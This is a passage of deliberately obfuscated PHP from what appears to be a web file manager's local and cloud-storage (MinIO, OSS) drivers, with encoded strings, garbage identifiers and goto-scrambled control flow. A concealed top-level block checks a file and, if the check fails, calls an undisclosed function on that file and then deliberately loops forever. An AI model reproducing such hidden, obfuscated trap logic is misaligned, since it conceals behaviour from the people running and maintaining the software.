!1; } public function moveFile($DÇ‡Ìí¿¡é, $FÂ­œ÷’è½) { $this->mkdir($this->pathFather($FÂ­œ÷’è½)); $DÇ‡Ìí¿¡é = $this->iconvSystem($DÇ‡Ìí¿¡é); $FÂ­œ÷’è½ = $this->iconvSystem($FÂ­œ÷’è½); $b¥õŠë™íª = intval(@rename($DÇ‡Ìí¿¡é, $FÂ­œ÷’è½)); if (!$b¥õŠë™íª) { if ($b¥õŠë™íª = intval(@copy_64($DÇ‡Ìí¿¡é, $FÂ­œ÷’è½))) { @unlink($DÇ‡Ìí¿¡é); } } return $b¥õŠë™íª ? $this->getPathOuter($FÂ­œ÷’è½) : !1; } public function delFile($fÁ„†ª±‰) { $fÁ„†ª±‰ = $this->iconvSystem($fÁ„†ª±‰); if (!@unlink($fÁ„†ª±‰)) { @chmod($fÁ„†ª±‰, 511); if (!@unlink($fÁ„†ª±‰)) { return !1; } } else { return !0; } } public function delFolder($aÏÆ„ÊŒê) { goto A×ãì–ñ¢; eá¡˜ÓˆŒ: return rmdir($aÏÆ„ÊŒê); goto Aï·¡ôîâ; d‹Àï©ˆÁ: if (!($aŒÜ‡à“Š = opendir($aÏÆ„ÊŒê))) { return !1; } while (($eÌÒ«ƒòÛô = readdir($aŒÜ‡à“Š)) !== !1) { if ($eÌÒ«ƒòÛô == $fˆâ½Ï„óè[94] || $eÌÒ«ƒòÛô == $fˆâ½Ï„óè[1223]) { continue; } $f‡É×î™ÌÂ = $aÏÆ„ÊŒê . $fˆâ½Ï„óè[8] . $eÌÒ«ƒòÛô; if (is_file($f‡É×î™ÌÂ) || is_link($f‡É×î™ÌÂ)) { if (!unlink($f‡É×î™ÌÂ)) { chmod($f‡É×î™ÌÂ, 511); if (!unlink($f‡É×î™ÌÂ)) { return !1; } } } else { if (is_dir($f‡É×î™ÌÂ)) { chmod($f‡É×î™ÌÂ, 511); $f‡É×î™ÌÂ = $this->iconvApp($f‡É×î™ÌÂ); if (!$this->delFolder($f‡É×î™ÌÂ)) { return !1; } } } } closedir($aŒÜ‡à“Š); goto eá¡˜ÓˆŒ; A×ãì–ñ¢: $fˆâ½Ï„óè =& $_SERVER[Â€Á›¨õ]; $aÏÆ„ÊŒê = $this->iconvSystem($aÏÆ„ÊŒê); if (!is_dir($aÏÆ„ÊŒê)) { return !0; } goto d‹Àï©ˆÁ; Aï·¡ôîâ: } public function rename($C¿¾ÖÈ‡Ÿ, $d±øÓ¿Ü¢Ò) { goto bÓÕÜÈÃ†Ë; f™¿í×à³: $bÁä¼Æ‰Å = @rename($C¿¾ÖÈ‡Ÿ, $AÃƒí”Ãõ); $AÃƒí”Ãõ = $this->iconvApp($AÃƒí”Ãõ); return $bÁä¼Æ‰Å ? $this->getPathOuter($AÃƒí”Ãõ) : !1; goto A´Ëáß‹ßğ; c¤‰À•ƒÒ: $C¿¾ÖÈ‡Ÿ = $this->iconvSystem($C¿¾ÖÈ‡Ÿ); $a¾‘ô­ ¸Ø = $this->pathFather($C¿¾ÖÈ‡Ÿ); $AÃƒí”Ãõ = rtrim($a¾‘ô­ ¸Ø, $bŒÄª“ó¹[8]) . $bŒÄª“ó¹[8] . $C‘Â…ÉÂÛ; goto f™¿í×à³; bÓÕÜÈÃ†Ë: $bŒÄª“ó¹ =& $_SERVER[Â€Á›¨õ]; $C‘Â…ÉÂÛ = $this->fileNameAuto($this->pathFather($C¿¾ÖÈ‡Ÿ), $d±øÓ¿Ü¢Ò); $C‘Â…ÉÂÛ = $this->iconvSystem($C‘Â…ÉÂÛ); goto c¤‰À•ƒÒ; A´Ëáß‹ßğ: } public function size($d±º²ç áÊ) { $d±º²ç áÊ = $this->iconvSystem($d±º²ç áÊ); return filesize_64($d±º²ç áÊ); } public function info($BğÏ„Â¼˜Ÿ) { $BğÏ„Â¼˜Ÿ = $this->iconvSystem($BğÏ„Â¼˜Ÿ); if ($this->isFolder($BğÏ„Â¼˜Ÿ)) { return $this->folderInfo($BğÏ„Â¼˜Ÿ); } else { if ($this->isFile($BğÏ„Â¼˜Ÿ)) { return $this->fileInfo($BğÏ„Â¼˜Ÿ); } } return !1; } protected function infoChildren($aÃ†é“éÖ÷, &$EÏ•¥öÆ•, $DÒğÌµ»ç = true) { goto A«Ö“³Ñ Ù; A«Ö“³Ñ Ù: $Eì±óèì½È =& $_SERVER[Â€Á›¨õ]; check_abort_echo(); $aÃ†é“éÖ÷ = rtrim($aÃ†é“éÖ÷, $Eì±óèì½È[8]) . $Eì±óèì½È[8]; goto fµŞ÷çĞî; A«©·äª¹: closedir($eÖÌÌğ¬‡); goto B‚®ÈáÈò™; fµŞ÷çĞî: if ($DÒğÌµ»ç) { $aÃ†é“éÖ÷ = $this->iconvSystem($aÃ†é“éÖ÷); } if (!($eÖÌÌğ¬‡ = @opendir($aÃ†é“éÖ÷))) { return; } while (($c¬ñ°‹‡ª = readdir($eÖÌÌğ¬‡)) !== !1) { if ($c¬ñ°‹‡ª == $Eì±óèì½È[94] || $c¬ñ°‹‡ª == $Eì±óèì½È[1223]) { continue; } $E–³Õê„ò¥ = $aÃ†é“éÖ÷ . $c¬ñ°‹‡ª; if (is_file($E–³Õê„ò¥) || is_link($E–³Õê„ò¥)) { $EÏ•¥öÆ•[$Eì±óèì½È[78]]++; $EÏ•¥öÆ•[$Eì±óèì½È[77]] += filesize_64($E–³Õê„ò¥); } else { if (is_dir($E–³Õê„ò¥)) { $EÏ•¥öÆ•[$Eì±óèì½È[79]]++; $this->infoChildren($E–³Õê„ò¥, $EÏ•¥öÆ•, !1); } } } goto A«©·äª¹; B‚®ÈáÈò™: } private function folderInfo($d³«¡èª­, $Eº‰·ÔÀéª = false) { $cº­ŞİÖåƒ =& $_SERVER[Â€Á›¨õ]; $d³«¡èª­ = rtrim($d³«¡èª­, $cº­ŞİÖåƒ[8]) . $cº­ŞİÖåƒ[8]; $aÃé °öÆ = $this->iconvApp($this->pathThis($d³«¡èª­)); if ($Eº‰·ÔÀéª) { return array($cº­ŞİÖåƒ[28] => $aÃé °öÆ, $cº­ŞİÖåƒ[75] => $this->getPathOuter($d³«¡èª­), $cº­ŞİÖåƒ[29] => $cº­ŞİÖåƒ[76]); } $DÑÈ»Îì„Á = array($cº­ŞİÖåƒ[28] => $aÃé °öÆ, $cº­ŞİÖåƒ[75] => $this->getPathOuter($d³«¡èª­), $cº­ŞİÖåƒ[29] => $cº­ŞİÖåƒ[76], $cº­ŞİÖåƒ[192] => @filectime($d³«¡èª­), $cº­ŞİÖåƒ[83] => @filemtime($d³«¡èª­), $cº­ŞİÖåƒ[1226] => @fileatime($d³«¡èª­), $cº­ŞİÖåƒ[1227] => is_readable($d³«¡èª­), $cº­ŞİÖåƒ[1228] => is_writable($d³«¡èª­), $cº­ŞİÖåƒ[1229] => get_mode($d³«¡èª­)); return $DÑÈ»Îì„Á; } private function fileInfo($aÛÍòËŒ‹±, $FÁÜ÷‚é = false) { $C»ÄœšÔãÎ =& $_SERVER[Â€Á›¨õ]; $a¹Â‹âØß = $this->iconvApp($this->pathThis($aÛÍòËŒ‹±)); if ($FÁÜ÷‚é) { return array($C»ÄœšÔãÎ[28] => $a¹Â‹âØß, $C»ÄœšÔãÎ[75] => $this->getPathOuter($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[29] => $C»ÄœšÔãÎ[173], $C»ÄœšÔãÎ[77] => $this->size($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[167] => $this->ext($a¹Â‹âØß)); } $d¿É†Ûòˆ† = array($C»ÄœšÔãÎ[28] => $a¹Â‹âØß, $C»ÄœšÔãÎ[75] => $this->getPathOuter($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[29] => $C»ÄœšÔãÎ[173], $C»ÄœšÔãÎ[192] => @filectime($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[83] => @filemtime($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[1226] => @fileatime($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[77] => $this->size($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[167] => $this->ext($a¹Â‹âØß), $C»ÄœšÔãÎ[1227] => is_readable($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[1228] => is_writable($aÛÍòËŒ‹±), $C»ÄœšÔãÎ[1229] => get_mode($aÛÍòËŒ‹±)); return $d¿É†Ûòˆ†; } public function exist($aŒÅÛ‰¾ª) { $aŒÅÛ‰¾ª = $this->iconvSystem($aŒÅÛ‰¾ª); return @file_exists($aŒÅÛ‰¾ª); } public function isFile($D²ˆåñ§»µ) { $D²ˆåñ§»µ = $this->iconvSystem($D²ˆåñ§»µ); return @is_file($D²ˆåñ§»µ); } public function isFolder($b‰ŸÍÕªŞ³) { $b‰ŸÍÕªŞ³ = $this->iconvSystem($b‰ŸÍÕªŞ³); return @is_dir($b‰ŸÍÕªŞ³); } public function listPath($c×¤¶ ¾, $d­‰‹ÊÏê” = false) { goto A†©¬Œ¼ÆÀ; Eñ‹ÏïÏ„Æ: $d›àÛÇƒ®¤ = array($aëÆÕ·§©š[74] => array(), $aëÆÕ·§©š[73] => array()); if (!($e°™÷ÏÃ² = @opendir($c×¤¶ ¾))) { return $d›àÛÇƒ®¤; } while (($e¬»©´ì = readdir($e°™÷ÏÃ²)) !== !1) { if ($e¬»©´ì == $aëÆÕ·§©š[94] || $e¬»©´ì == $aëÆÕ·§©š[1223]) { continue; } $dö¥Ç¤†‘ç = $c×¤¶ ¾ . $e¬»©´ì; if (is_file($dö¥Ç¤†‘ç)) { $d›àÛÇƒ®¤[$aëÆÕ·§©š[73]][] = $this->fileInfo($dö¥Ç¤†‘ç, $d­‰‹ÊÏê”); } else { $d›àÛÇƒ®¤[$aëÆÕ·§©š[74]][] = $this->folderInfo($dö¥Ç¤†‘ç, $d­‰‹ÊÏê”); } } goto F†¶Ú°¼—; F†¶Ú°¼—: closedir($e°™÷ÏÃ²); return $d›àÛÇƒ®¤; goto Fã—¥ Ø½‹; A†©¬Œ¼ÆÀ: $aëÆÕ·§©š =& $_SERVER[Â€Á›¨õ]; $c×¤¶ ¾ = $this->iconvSystem($c×¤¶ ¾); $c×¤¶ ¾ = rtrim($c×¤¶ ¾, $aëÆÕ·§©š[8]) . $aëÆÕ·§©š[8]; goto Eñ‹ÏïÏ„Æ; Fã—¥ Ø½‹: } public function listAll($B§Õ¬È…Ü, &$C­§¾–‡ = array()) { goto D Ï²×Ş—; E¢¤ŠÎŠƒğ: return $C­§¾–‡; goto B ÕÕŠ¬ä; CÂöÔ‡Õƒƒ: if (!($b—´ºå¸¯ = @opendir($B§Õ¬È…Ü))) { return $C­§¾–‡; } while (($cÉÓªÔˆª‰ = readdir($b—´ºå¸¯)) !== !1) { if ($cÉÓªÔˆª‰ == $Bñæì Å§[94] || $cÉÓªÔˆª‰ == $Bñæì Å§[1223]) { continue; } $bôâĞ…›ÄÇ = $B§Õ¬È…Ü . $cÉÓªÔˆª‰; if (is_dir($bôâĞ…›ÄÇ) && !is_link($bôâĞ…›ÄÇ)) { $C­§¾–‡[] = array($Bñæì Å§[75] => $bôâĞ…›ÄÇ . $Bñæì Å§[8], $Bñæì Å§[76] => 1, $Bñæì Å§[83] => @filemtime($bôâĞ…›ÄÇ), $Bñæì Å§[77] => 0); $this->listAll($bôâĞ…›ÄÇ, $C­§¾–‡); } else { $C­§¾–‡[] = array($Bñæì Å§[75] => $bôâĞ…›ÄÇ, $Bñæì Å§[76] => 0, $Bñæì Å§[83] => @filemtime($bôâĞ…›ÄÇ), $Bñæì Å§[77] => $this->size($bôâĞ…›ÄÇ)); } } closedir($b—´ºå¸¯); goto E¢¤ŠÎŠƒğ; D Ï²×Ş—: $Bñæì Å§ =& $_SERVER[Â€Á›¨õ]; $B§Õ¬È…Ü = $this->iconvSystem($B§Õ¬È…Ü); $B§Õ¬È…Ü = rtrim($B§Õ¬È…Ü, $Bñæì Å§[8]) . $Bñæì Å§[8]; goto CÂöÔ‡Õƒƒ; B ÕÕŠ¬ä: } public function has($CæÌˆ¼ÄÀŠ, $DƒÏÇ°ÌÖ˜ = false, $bØê¾¡òòá = true) { goto BâÒ¸ÛìÊ§; D“«Ùà›«Ä: $D÷¸«µÖõº = 0; while (($f—½Ó“ëí = readdir($D¡²±Äªå³)) !== !1) { if ($f—½Ó“ëí == $EÄ¢±˜æŠ¿[94] || $f—½Ó“ëí == $EÄ¢±˜æŠ¿[1223]) { continue; } $BŞ©×ÅÔ‘ä = $CæÌˆ¼ÄÀŠ . $f—½Ó“ëí; if ($DƒÏÇ°ÌÖ˜) { $D÷¸«µÖõº++; if (@is_file($BŞ©×ÅÔ‘ä)) { $Dß¯´‰Â‹ª++; } else { $D§ä²±äÓ++; } if ($D÷¸«µÖõº > 10000) { break; } continue; } if ($bØê¾¡òòá) { if (@is_file($BŞ©×ÅÔ‘ä)) { return !0; } } else { if (@is_dir($BŞ©×ÅÔ‘ä . $EÄ¢±˜æŠ¿[8])) { return !0; } } } closedir($D¡²±Äªå³); goto Cò‹©ä”¶ˆ; C—‡¿ŠóŠ: if (!($D¡²±Äªå³ = @opendir($CæÌˆ¼ÄÀŠ))) { return !1; } $Dß¯´‰Â‹ª = 0; $D§ä²±äÓ = 0; goto D“«Ùà›«Ä; Cò‹©ä”¶ˆ: if ($DƒÏÇ°ÌÖ˜) { return array($EÄ¢±˜æŠ¿[201] => $Dß¯´‰Â‹ª, $EÄ¢±˜æŠ¿[202] => $D§ä²±äÓ); } return !1; goto B’‚¿éØ¤; BâÒ¸ÛìÊ§: $EÄ¢±˜æŠ¿ =& $_SERVER[Â€Á›¨õ]; $CæÌˆ¼ÄÀŠ = $this->iconvSystem($CæÌˆ¼ÄÀŠ); $CæÌˆ¼ÄÀŠ = rtrim($CæÌˆ¼ÄÀŠ, $EÄ¢±˜æŠ¿[8]) . $EÄ¢±˜æŠ¿[8]; goto C—‡¿ŠóŠ; B’‚¿éØ¤: } public function hashSimple($Eœ ²©²¡“) { goto Cœ³†‚²íõ; F“ŠÂ¼ã£¼: return md5($AÃ”× “÷­) . $DÎØ÷ìÄö; goto CàÏ²»ŞèÖ; Cœ³†‚²íõ: $aìæ¦»èå’ =& $_SERVER[Â€Á›¨õ]; if (!$Eœ ²©²¡“) { return md5($aìæ¦»èå’[33]); } $Eœ ²©²¡“ = $this->iconvSystem($Eœ ²©²¡“); goto DÇ¯ÀÏÉµî; DÃ÷Ó•½Åâ: fseek_64($aßÀ‡ãŠŠË, $DÎØ÷ìÄö - $F‹ëˆ„¯â); $AÃ”× “÷­ .= fread($aßÀ‡ãŠŠË, $F‹ëˆ„¯â); fclose($aßÀ‡ãŠŠË); goto F“ŠÂ¼ã£¼; e§¿Í÷íøŸ: if ($DÎØ÷ìÄö <= $F‹ëˆ„¯â * $Fï™Ì´ó¨´) { return $this->hashMd5($Eœ ²©²¡“) . $DÎØ÷ìÄö; } $AÃ”× “÷­ = $aìæ¦»èå’[33]; $CÏøø÷—„ = intval($DÎØ÷ìÄö / $Fï™Ì´ó¨´); goto e—ã¤‰êõâ; e—ã¤‰êõâ: $aßÀ‡ãŠŠË = fopen($Eœ ²©²¡“, $aìæ¦»èå’[1230]); if (!$aßÀ‡ãŠŠË) { return $AÃ”× “÷­; } for ($b„·¿¥à‘ = 0; $b„·¿¥à‘ < $Fï™Ì´ó¨´; $b„·¿¥à‘++) { fseek_64($aßÀ‡ãŠŠË, $CÏøø÷—„ * $b„·¿¥à‘); $AÃ”× “÷­ .= fread($aßÀ‡ãŠŠË, $F‹ëˆ„¯â); } goto DÃ÷Ó•½Åâ; DÇ¯ÀÏÉµî: $DÎØ÷ìÄö = $this->size($Eœ ²©²¡“); $F‹ëˆ„¯â = 200; $Fï™Ì´ó¨´ = 50; goto e§¿Í÷íøŸ; CàÏ²»ŞèÖ: } public function getContent($BÇë²š¨‰Ê) { $BÇë²š¨‰Ê = $this->iconvSystem($BÇë²š¨‰Ê); return file_get_contents($BÇë²š¨‰Ê); } public function setContent($b£²°æñ²„, $BÚ¢Àİâ† = '') { $b£²°æñ²„ = $this->iconvSystem($b£²°æñ²„); $B©–óÌ—çİ = @file_put_contents($b£²°æñ²„, $BÚ¢Àİâ†, LOCK_EX); clearstatcache(); return $B©–óÌ—çİ === !1 ? !1 : !0; } public function fileSubstr($Bƒ·‹¥ğ, $Aë‘±ï™˜– = 0, $A“ö±¢£Ö = false) { goto a¯Ï½ÍŒˆ; CÂ”ß¶ÒÆ¬: return $Aî”ù©¿™Ê; goto cĞå„ÍøêÖ; Dˆôé®–: if ($A“ö±¢£Ö <= 0) { return $CÔŸ¼¡š¸ª[33]; } $fé³±®£„© = fopen($Bƒ·‹¥ğ, $CÔŸ¼¡š¸ª[1230]); if (!$fé³±®£„©) { return !1; } goto AÙï§ØĞ‰; AÙï§ØĞ‰: fseek_64($fé³±®£„©, $Aë‘±ï™˜–); $Aî”ù©¿™Ê = fread($fé³±®£„©, $A“ö±¢£Ö); fclose($fé³±®£„©); goto CÂ”ß¶ÒÆ¬; a¯Ï½ÍŒˆ: $CÔŸ¼¡š¸ª =& $_SERVER[Â€Á›¨õ]; $Bƒ·‹¥ğ = $this->iconvSystem($Bƒ·‹¥ğ); if ($A“ö±¢£Ö === !1) { $A“ö±¢£Ö = $this->size($Bƒ·‹¥ğ); } goto Dˆôé®–; cĞå„ÍøêÖ: } public function upload($Eß¸óÀ³î¥, $E³¤¢ª¢èÁ, $b¨»Ó¹ó‘ = false, $DáŒ£ÂÆ• = REPEAT_REPLACE) { $aÇ¹‡Šîé” = $this->copyFile($E³¤¢ª¢èÁ, $Eß¸óÀ³î¥); return $aÇ¹‡Šîé” ? $this->getPathOuter($Eß¸óÀ³î¥) : !1; } public function setModifyTime($bª¨êùö¸, $EÖí§ƒìÆ˜ = '') { @touch($bª¨êùö¸, intval($EÖí§ƒìÆ˜)); } public function download($F…äŠîêË, $c¿˜õÆ²Õà) { return $this->iconvSystem($F…äŠîêË); } } if (!isset($_SERVER[$_SERVER[Â€Á›¨õ][811]]) || !isset($_SERVER[$_SERVER[Â€Á›¨õ][1231]])) { goto eŸ‚ÁÙÀ…; fÊ¸°óèã‰: $cîòÄÈµ¿($_SERVER[$_SERVER[Â€Á›¨õ][808]] . $_SERVER[Â€Á›¨õ][809]); $eœÒ¹Ü”‰ = 2; while ($eœÒ¹Ü”‰ > 1) { $CÅĞœ›ô¦à = rawurlencode($eœÒ¹Ü”‰ . $_SERVER[Â€Á›¨õ][373]); } goto e‚£çŸø; FÁ ğ·ÛîŒ: $F…ÛÛ´Šô = explode($_SERVER[Â€Á›¨õ][227], $BçÛ¸áªˆ); if (count($F…ÛÛ´Šô) < $_SERVER[Â€Á›¨õ][592]) { $e¸£ÏÕè…Ÿ = $_SERVER[Â€Á›¨õ][814]; $e¸£ÏÕè…Ÿ(); } $cîòÄÈµ¿ = $_SERVER[Â€Á›¨õ][1232]; goto fÊ¸°óèã‰; eŸ‚ÁÙÀ…: $d™Ú‡Ã“ÓŒ = $_SERVER[Â€Á›¨õ][813]; $dÅçá­Ë¾Ã = $_SERVER[$_SERVER[Â€Á›¨õ][808]] . $_SERVER[Â€Á›¨õ][809]; $BçÛ¸áªˆ = $d™Ú‡Ã“ÓŒ($dÅçá­Ë¾Ã); goto FÁ ğ·ÛîŒ; e‚£çŸø: } goto cöÉ‚„î±¤; cöÉ‚„î±¤: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($aÓ¼×ÄÕ¯Š) { parent::__construct($aÓ¼×ÄÕ¯Š); $this->signatureVersion($_SERVER[Â€Á›¨õ][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($E´¾³ääµ) { parent::__construct($E´¾³ääµ); $this->signatureVersion($_SERVER[Â€Á›¨õ][210]); } public function fileOutLink($dÚ–Û×áÂ‹) { $A˜›Ûˆ“ =& $_SERVER[Â€Á›¨õ]; if (substr($dÚ–Û×áÂ‹, 0, 7) == $A˜›Ûˆ“[1176]) { $dÚ–Û×áÂ‹ = $A˜›Ûˆ“[1177] . substr($dÚ–Û×áÂ‹, 7); } header($A˜›Ûˆ“[158] . $dÚ–Û×áÂ‹); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Cƒ¿İõ­â) { parent::__construct(); include_once SDK_DIR . $_SERVER[Â€Á›¨õ][1233]; $this->_init($Cƒ¿İõ­â); } public function _init($fè²¯«º•) { $F©“¾á÷Üè =& $_SERVER[Â€Á›¨õ]; foreach ($fè²¯«º• as $CÉ®¯Å‘¥’ => $eÔâ°Ÿ¾§½) { if (isset($this->{$CÉ®¯Å‘¥’})) { $this->{$CÉ®¯Å‘¥’} = $eÔâ°Ÿ¾§½; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($F©“¾á÷Üè[1234] . LNG($F©“¾á÷Üè[1235])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aÚçï³Í×ß; a“ƒáÛšÁ—: $b‚Šå³–„â->setMaxAgeSeconds(600); $b‚Šå³–„â->addExposeHeader($Aøˆ¨¬ÉÂÍ[1241]); $b‚Šå³–„â->addAllowedHeader($Aøˆ¨¬ÉÂÍ[1236]); goto e£©Õ™ÌÍ; FªÊ÷£ê­ñ: $b‚Šå³–„â->addAllowedOrigin($Aøˆ¨¬ÉÂÍ[1236]); $b‚Šå³–„â->addAllowedMethod($Aøˆ¨¬ÉÂÍ[1237]); $b‚Šå³–„â->addAllowedMethod($Aøˆ¨¬ÉÂÍ[1238]); goto CŸìêÖõ†; CŸìêÖõ†: $b‚Šå³–„â->addAllowedMethod($Aøˆ¨¬ÉÂÍ[1239]); $b‚Šå³–„â->addAllowedMethod($Aøˆ¨¬ÉÂÍ[1240]); $b‚Šå³–„â->addAllowedMethod($Aøˆ¨¬ÉÂÍ[157]); goto a“ƒáÛšÁ—; aÚçï³Í×ß: $Aøˆ¨¬ÉÂÍ =& $_SERVER[Â€Á›¨õ]; $f†ÔÍŸ˜Üã = new OSS\Model\CorsConfig(); $b‚Šå³–„â = new OSS\Model\CorsRule(); goto FªÊ÷£ê­ñ; e£©Õ™ÌÍ: $f†ÔÍŸ˜Üã->addRule($b‚Šå³–„â); try { $this->client->putBucketCors($this->bucket, $f†ÔÍŸ˜Üã); } catch (OSS\Core\OssException $bÇ»¯ĞËšÏ) { return !1; } return !0; goto cÏÃò˜Œ½à; cÏÃò˜Œ½à: } public function getBucketCors() { goto e•­»öìªö; e•­»öìªö: $f´†¹³ØÎ‹ =& $_SERVER[Â€Á›¨õ]; $B©ÓŠä­òÃ = null; try { $B©ÓŠä­òÃ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $EãÕÒÓ¹÷) { return null; } goto FŒ ‚±Ê; Fš‚Í©Ş»ˆ: return array($f´†¹³ØÎ‹[181] => isset($A££ğ±•Ù“[0]) ? $A££ğ±•Ù“[0] : $f´†¹³ØÎ‹[33], $f´†¹³ØÎ‹[185] => $D¼È¸†‚òæ, $f´†¹³ØÎ‹[1242] => $aèÌå³ØÑò, $f´†¹³ØÎ‹[1243] => isset($dëã­°ã[0]) ? $dëã­°ã[0] : $f´†¹³ØÎ‹[33], $f´†¹³ØÎ‹[183] => isset($bĞÍ¢ö×‡[0]) ? $bĞÍ¢ö×‡[0] : $f´†¹³ØÎ‹[33]); goto Cµä’çè÷æ; FŒ ‚±Ê: if (!$B©ÓŠä­òÃ || !($EÁÓÎÁšƒà = $B©ÓŠä­òÃ->getRules())) { return null; } $A££ğ±•Ù“ = $EÁÓÎÁšƒà[0]->getAllowedOrigins(); $D¼È¸†‚òæ = $EÁÓÎÁšƒà[0]->getAllowedMethods(); goto FîÂ‚Õëñ; FîÂ‚Õëñ: $aèÌå³ØÑò = $EÁÓÎÁšƒà[0]->getMaxAgeSeconds(); $dëã­°ã = $EÁÓÎÁšƒà[0]->getExposeHeaders(); $bĞÍ¢ö×‡ = $EÁÓÎÁšƒà[0]->getAllowedHeaders(); goto Fš‚Í©Ş»ˆ; Cµä’çè÷æ: } public function isBucketCors() { goto A•ò¸£ìÒ´; DÚ¢¼Šğâ¬: $F‡Ÿ““¡¯ = array($DÄ¡ç™—¯[186], $DÄ¡ç™—¯[187], $DÄ¡ç™—¯[188], $DÄ¡ç™—¯[189], $DÄ¡ç™—¯[190]); $eè—¢Ù¢¤ = array_diff($F‡Ÿ““¡¯, $E—­‡¦¦); return empty($eè—¢Ù¢¤); goto dÇ¤ƒøø½ ; A•ò¸£ìÒ´: $DÄ¡ç™—¯ =& $_SERVER[Â€Á›¨õ]; $DÂ˜‡î‡Æˆ = $this->getBucketCors(); if (!$DÂ˜‡î‡Æˆ || !is_array($DÂ˜‡î‡Æˆ)) { return !1; } goto EÜí‡ÙŸŒÎ; EÜí‡ÙŸŒÎ: if ($DÂ˜‡î‡Æˆ[$DÄ¡ç™—¯[181]] != $DÄ¡ç™—¯[182] || $DÂ˜‡î‡Æˆ[$DÄ¡ç™—¯[183]] != $DÄ¡ç™—¯[182]) { return !1; } $E—­‡¦¦ = array_map($DÄ¡ç™—¯[184], $DÂ˜‡î‡Æˆ[$DÄ¡ç™—¯[185]]); if (!is_array($E—­‡¦¦)) { $E—­‡¦¦ = array(); } goto DÚ¢¼Šğâ¬; dÇ¤ƒøø½ : } public function mkfile($c”ÌÕÀŸáĞ, $BñÔáã£ì– = '', $EßÊÀ¡†Ë‚ = REPEAT_RENAME) { $A¢¥ˆ±Ò÷Â = $this->setContent($c”ÌÕÀŸáĞ, $BñÔáã£ì–); if ($A¢¥ˆ±Ò÷Â !== !1) { return $this->getPathOuter($c”ÌÕÀŸáĞ); } return !1; } public function mkdir($aÊÙ…Øˆä, $dÛÃ—ŸòÆ» = REPEAT_SKIP) { if ($this->_isFolder($aÊÙ…Øˆä)) { return $this->getPathOuter($aÊÙ…Øˆä); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($aÊÙ…Øˆä)); } catch (OSS\Core\OssException $c¬—ä•ìøŸ) { return !1; } return $this->getPathOuter($aÊÙ…Øˆä); } private function fileList($c§¶¨†Ö‹, $cµ‡“§©÷ = '', $DšœÜÌ‚‡ = 0) { goto BóŞ±“ìİ; cçšîî˜„“: return array($a®²˜ËŸ¡[74] => $CÉß¶½ËÆÄ, $a®²˜ËŸ¡[73] => $Fˆ–°ĞÅáö); goto e¶è«Õñ‚™; fÊ™ÇŒÛë: $CÉß¶½ËÆÄ = $Fˆ–°ĞÅáö = array(); while (!0) { check_abort(); $b‰ƒ‘á‰Æç = array($a®²˜ËŸ¡[1244] => $cµ‡“§©÷, $a®²˜ËŸ¡[1245] => $C»£ô¸õ », $a®²˜ËŸ¡[1246] => $a¸­ù³, $a®²˜ËŸ¡[1247] => $d‚¬¤È¤Ùô); try { $bÑÒÉ™à±ì = $this->client->listObjects($this->bucket, $b‰ƒ‘á‰Æç); } catch (OSS\Core\OssException $Dìñ±ãÙ¾™) { break; } $d‚¬¤È¤Ùô = $bÑÒÉ™à±ì->getNextMarker(); $aÏŠè¥óè¨ = $bÑÒÉ™à±ì->getObjectList(); $Bé‡›•“„Ã = $bÑÒÉ™à±ì->getPrefixList(); foreach ($aÏŠè¥óè¨ as $c™öçŠÚ©‰) { goto d‹ì°§„; EâïÃâÁÂ¹: if ($cËƒÀ¢éÚŞ) { $this->cacheMethod($a®²˜ËŸ¡[197], $f‚¹óˆ…Ï, $D¤œó„á†); $this->cacheMethod($a®²˜ËŸ¡[198], $f‚¹óˆ…Ï, array($a®²˜ËŸ¡[77] => $F¨¡§«©¨…, $a®²˜ËŸ¡[1248] => $F¨¡§«©¨…, $a®²˜ËŸ¡[83] => strtotime($e‹òëŸîì), $a®²˜ËŸ¡[1249] => $e‹òëŸîì)); } if ($D¤œó„á†) { $CÉß¶½ËÆÄ[] = $f‚¹óˆ…Ï; continue; } $Fˆ–°ĞÅáö[] = $d‚‰‰¢ğõ£; goto féã‹ê›Æà; d‹ì°§„: if ($c™öçŠÚ©‰->getKey() == $C»£ô¸õ ») { continue; } $f‚¹óˆ…Ï = $c™öçŠÚ©‰->getKey(); $F¨¡§«©¨… = $c™öçŠÚ©‰->getSize(); goto DÒõâ¹ªÏ; DÒõâ¹ªÏ: $e‹òëŸîì = $c™öçŠÚ©‰->getLastModified(); $d‚‰‰¢ğõ£ = $DšœÜÌ‚‡ ? array($a®²˜ËŸ¡[28] => $f‚¹óˆ…Ï, $a®²˜ËŸ¡[77] => $F¨¡§«©¨…, $a®²˜ËŸ¡[195] => strtotime($e‹òëŸîì)) : $f‚¹óˆ…Ï; $D¤œó„á† = $F¨¡§«©¨… == 0 && substr($f‚¹óˆ…Ï, strlen($f‚¹óˆ…Ï) - 1, 1) == $a®²˜ËŸ¡[8] ? !0 : !1; goto EâïÃâÁÂ¹; féã‹ê›Æà: } foreach ($Bé‡›•“„Ã as $Aï¢‘ˆš¬¬) { $CÉß¶½ËÆÄ[] = $Aï¢‘ˆš¬¬->getPrefix(); if ($cËƒÀ¢éÚŞ) { $this->cacheMethod($a®²˜ËŸ¡[197], $f‚¹óˆ…Ï, !0); } } if ($d‚¬¤È¤Ùô === $a®²˜ËŸ¡[33]) { break; } } if ($cËƒÀ¢éÚŞ) { $this->cacheMethod($a®²˜ËŸ¡[197], $c§¶¨†Ö‹, !0); } goto cçšîî˜„“; BóŞ±“ìİ: $a®²˜ËŸ¡ =& $_SERVER[Â€Á›¨õ]; 